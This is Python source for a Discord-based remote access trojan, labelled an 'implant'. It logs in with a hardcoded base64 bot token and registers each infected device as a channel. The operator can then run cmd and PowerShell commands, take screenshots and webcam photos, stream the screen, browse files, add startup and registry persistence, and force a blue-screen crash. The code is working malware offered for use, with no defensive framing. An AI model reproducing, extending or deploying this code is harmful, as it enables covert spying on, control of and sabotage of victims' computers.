import discord
from discord import Embed
import os
import socket
import asyncio
import shlex
import mss
from PIL import Image
import io
import sys      # For PyInstaller pathing
import base64   # For the fallback token
import ctypes

# Import all other execution modules
import command_executor as cmd; import notification_sender as notifier; import screenshot_taker as ss
import system_info as sysinfo; import web_opener; import startup_manager
import webcam_manager as wcm; import file_explorer as fe; import persistence_manager as pm
import image_uploader

# --- Configuration ---
TOKEN_FILE_NAME = 'token.txt' # The name of the optional override file
SERVER_CATEGORY_NAME = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'
STREAM_FRAME_PREFIX = 'STREAM_FRAME:'; EMBED_COLOR = 0x2B2D31

# MODIFIED: Your specific Base64 encoded fallback token is now hardcoded.
FALLBACK_TOKEN_B64 = "TVRNNU5qVTNOekEyTXpNME1qY3dOalk1T0EuRzhoTjgzLmNDQ1U4bXRQbDVvRC1rUHJ2RWtiR0djY3E2RTM1TklUOTluTHdN"

# --- Implant State ---
is_streaming = False

# --- Bot Setup & Helpers ---
intents = discord.Intents.default(); intents.message_content = True
client = discord.Client(intents=intents)

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def load_token():
    """
    Tries to load the token from token.txt, otherwise uses the hardcoded fallback.
    """
    token_file_path = resource_path(TOKEN_FILE_NAME)
    try:
        # Priority 1: Try to load from the external file if it exists.
        with open(token_file_path, 'r') as f:
            token = f.read().strip()
            print(f"Successfully loaded token from override file: {TOKEN_FILE_NAME}.")
            return token
    except FileNotFoundError:
        # Priority 2: If the file doesn't exist, use the hardcoded fallback.
        print(f"'{TOKEN_FILE_NAME}' not found. Using hardcoded fallback token.")
        try:
            fallback_token = base64.b64decode(FALLBACK_TOKEN_B64).decode('utf-8')
            return fallback_token
        except Exception as e:
            print(f"FATAL ERROR: Could not decode the fallback token. Is it valid Base64? Error: {e}")
            raise


def bluescreen() -> str:
    """Triggers a Blue Screen of Death (BSOD) on the target device."""
    try:
        # Adjust privilege to SE_SHUTDOWN_NAME
        privilege = ctypes.windll.advapi32.LookupPrivilegeValue(None, "SeShutdownPrivilege")
        token = ctypes.windll.advapi32.OpenProcess(0x1000000, False, -1)  # Use -1 for the current process
        ctypes.windll.advapi32.LookupPrivilegeValue(None, "SeShutdownPrivilege")
        ctypes.windll.advapi32.AdjustTokenPrivileges(token, 0, 1, privilege, 0, 0, 0, 0, 0)
        ctypes.windll.ntdll.RtlAdjustPrivilege(privilege, 1, 0, ctypes.byref(ctypes.c_byte()), 0, 0, 0, 0, 0)

        # Trigger BSOD
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        return "✅ BSOD triggered successfully."
    except Exception as e:
        return f"❌ Failed to trigger BSOD. Error: {e}"

def get_device_name():
    hostname = socket.gethostname(); return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()

# --- Core Event Handlers ---
@client.event
async def on_ready():
    print(f'Implant logged in as {client.user} on device {get_device_name()}')
    if not client.guilds: return
    guild = client.guilds[0]; device_name = get_device_name()
    category = discord.utils.get(guild.categories, name=SERVER_CATEGORY_NAME)
    if not category:
        try: category = await guild.create_category(SERVER_CATEGORY_NAME)
        except discord.Forbidden: return
    channel = discord.utils.get(guild.text_channels, name=device_name, category=category)
    if not channel:
        try: channel = await guild.create_text_channel(device_name, category=category)
        except discord.Forbidden: return
    try:
        embed = Embed(title="🟢 New Session Started", description=f"Device **{device_name}** is now online.", color=discord.Color.green())
        await channel.send(embed=embed)
    except discord.Forbidden: pass

@client.event
async def on_message(message):
    global is_streaming
    device_name = get_device_name()
    if message.channel.name != device_name or not message.content.startswith(INSTRUCTION_PREFIX): return

    content = message.content[len(INSTRUCTION_PREFIX):]
    parts = content.split(' ', 1)
    command_name = parts[0]
    args_str = parts[1] if len(parts) > 1 else ""

    try:
        if command_name == "start_stream":
            if not is_streaming:
                is_streaming = True
                asyncio.create_task(stream_loop(message.channel))
            return
        elif command_name == "stop_stream":
            if is_streaming:
                is_streaming = False
            return
        
        # ... (All other command handlers are unchanged)
        elif command_name == "kill": await message.channel.send(embed=Embed(title="🔴 Session Terminated",description=f"Device **{device_name}** has been shut down.",color=discord.Color.red()));await client.close()
        elif command_name == "runcmd": output=cmd.execute_command(args_str);await message.channel.send(embed=Embed(title="📟 CMD Output",description=f"```cmd\n{output[:1980]}\n```",color=EMBED_COLOR))
        elif command_name == "runpw": output=cmd.execute_powershell(args_str);await message.channel.send(embed=Embed(title=" PowerShell Output",description=f"```powershell\n{output[:1980]}\n```",color=EMBED_COLOR))
        elif command_name == "takescreenshot":
            ss_file=ss.take_screenshot()
            if ss_file and os.path.exists(ss_file):
                embed=Embed(title="📸 Screenshot Captured",color=EMBED_COLOR);f=discord.File(ss_file,filename="screenshot.png");embed.set_image(url="attachment://screenshot.png");
                await message.channel.send(file=f,embed=embed);os.remove(ss_file)
            else:raise Exception("Failed to create screenshot file.")
        elif command_name == "irlpicture":
            img_path=await asyncio.to_thread(wcm.capture_webcam_image)
            if img_path and os.path.exists(img_path):
                embed=Embed(title="📷 Webcam Image Captured",color=EMBED_COLOR);f=discord.File(img_path,filename="webcam.png");embed.set_image(url="attachment://webcam.png");
                await message.channel.send(file=f,embed=embed);os.remove(img_path)
            else:raise Exception("Failed to capture webcam image.")
        elif command_name == "systemspecs":
            specs=sysinfo.get_specs();embed=Embed(title=f"💻 System Specs for {device_name}",color=discord.Color.blue());
            embed.add_field(name="OS",value=f"{specs.get('platform','NA')} {specs.get('platform_release','N/A')}",inline=False);embed.add_field(name="CPU",value=f"{specs.get('cpu_name','N/A')}",inline=False);embed.add_field(name="RAM",value=f"{specs.get('ram_usage_percent','N/A')}% used",inline=False);
            await message.channel.send(embed=embed)
        elif command_name == "shownotification":
            t,m=shlex.split(args_str);s=notifier.show(t,m);msg="Success"if s else"Failure";
            await message.channel.send(embed=Embed(title="🖥️ Notification Status",description=msg,color=discord.Color.green()if s else discord.Color.orange()))
        elif command_name == "openwebsite":
            s=web_opener.open_url(args_str);msg=f"Success opening `{args_str}`."if s else f"Failure opening `{args_str}`.";
            await message.channel.send(embed=Embed(title="🌐 Open URL Status",description=msg,color=discord.Color.green()if s else discord.Color.orange()))
        elif command_name == "putinstartup":
            status=startup_manager.add_to_startup();await message.channel.send(embed=Embed(title="⚙️ Startup Folder Status",description=f"`{status}`",color=EMBED_COLOR))
        elif command_name == "persist":
            status=pm.add_to_registry(args_str);await message.channel.send(embed=Embed(title="⚙️ Registry Persistence Status",description=f"`{status}`",color=EMBED_COLOR))
        elif command_name == "explore":
            await message.channel.send(embed=fe.create_explorer_embed(args_str))
        elif command_name == "bsod":
            result = bluescreen()
        await message.channel.send(embed=Embed(title="💥 BSOD Triggered", description=result, color=discord.Color.red()))
        
    except Exception as e:
        await message.channel.send(embed=Embed(title="❌ Implant Error",description=f"On `{device_name}`:\n```py\n{e}\n```",color=discord.Color.red()))

# --- Streaming Loop ---
async def stream_loop(channel):
    global is_streaming
    print("[IMPLANT] Starting screenshare stream...")
    
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while is_streaming:
            try:
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
                
                img_bytes = io.BytesIO()
                img.save(img_bytes, format='JPEG', quality=75)
                img_bytes.seek(0)
                
                url = await asyncio.to_thread(image_uploader.upload_image, img_bytes.getvalue())
                
                if url:
                    await channel.send(f"{STREAM_FRAME_PREFIX}{url}")
                
                await asyncio.sleep(1.0) # Framerate control

            except Exception as e:
                print(f"[IMPLANT STREAM] Error in loop: {e}")
                is_streaming = False
                break

    print("[IMPLANT] Stopped screenshare stream.")

# --- Main Execution ---
if __name__ == "__main__":
    try: client.run(load_token())
    except Exception as e: print(f"Failed to start implant: {e}")